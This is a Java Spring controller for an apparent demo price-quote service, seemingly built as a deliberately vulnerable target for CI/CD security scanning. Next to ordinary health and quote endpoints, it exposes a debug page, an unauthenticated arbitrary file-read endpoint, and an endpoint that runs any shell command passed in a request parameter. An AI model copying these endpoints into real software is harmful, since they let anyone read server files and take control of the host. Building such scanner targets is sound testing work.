package com.pipebreach.democicdmaven.controller;

import com.pipebreach.democicdmaven.model.HealthResponse;
import com.pipebreach.democicdmaven.model.PriceQuoteRequest;
import com.pipebreach.democicdmaven.model.PriceQuoteResponse;
import com.pipebreach.democicdmaven.model.ServiceInfoResponse;
import com.pipebreach.democicdmaven.service.PriceQuoteService;
import jakarta.validation.Valid;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseStatus;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class PriceQuoteController {

  private final PriceQuoteService priceQuoteService;

  public PriceQuoteController(PriceQuoteService priceQuoteService) {
    this.priceQuoteService = priceQuoteService;
  }

  @GetMapping("/")
  public ServiceInfoResponse root() {
    return new ServiceInfoResponse(
        "demo-ci-cd-maven",
        "ok",
        "0.0.1-SNAPSHOT",
        List.of("GET /", "GET /health", "POST /api/v1/quotes"));
  }

  @GetMapping("/health")
  public HealthResponse health() {
    return new HealthResponse("ok");
  }

  @GetMapping(value = "/debug/index", produces = MediaType.TEXT_HTML_VALUE)
  public String debugIndex() {
    return """
        <html>
          <body>
            <h1>Debug Tools</h1>
            <form action="/api/v1/download" method="get">
              <input type="text" name="path" value="README.md" />
              <button type="submit">Download</button>
            </form>
            <form action="/api/v1/exec" method="get">
              <input type="text" name="cmd" value="whoami" />
              <button type="submit">Run</button>
            </form>
          </body>
        </html>
        """;
  }

  @GetMapping(value = "/api/v1/download", produces = MediaType.TEXT_PLAIN_VALUE)
  public String download(@RequestParam String path) throws IOException {
    return Files.readString(Path.of(path));
  }

  @GetMapping(value = "/api/v1/exec", produces = MediaType.TEXT_PLAIN_VALUE)
  public String exec(@RequestParam String cmd) throws IOException {
    Process process = new ProcessBuilder("sh", "-c", cmd).start();
    try (BufferedReader reader =
        new BufferedReader(new InputStreamReader(process.getInputStream()))) {
      return reader.lines().reduce("", (left, right) -> left + right + "\n");
    }
  }

  @PostMapping("/api/v1/quotes")
  @ResponseStatus(HttpStatus.OK)
  public PriceQuoteResponse createQuote(@Valid @RequestBody PriceQuoteRequest request) {
    return priceQuoteService.calculate(request);
  }
}
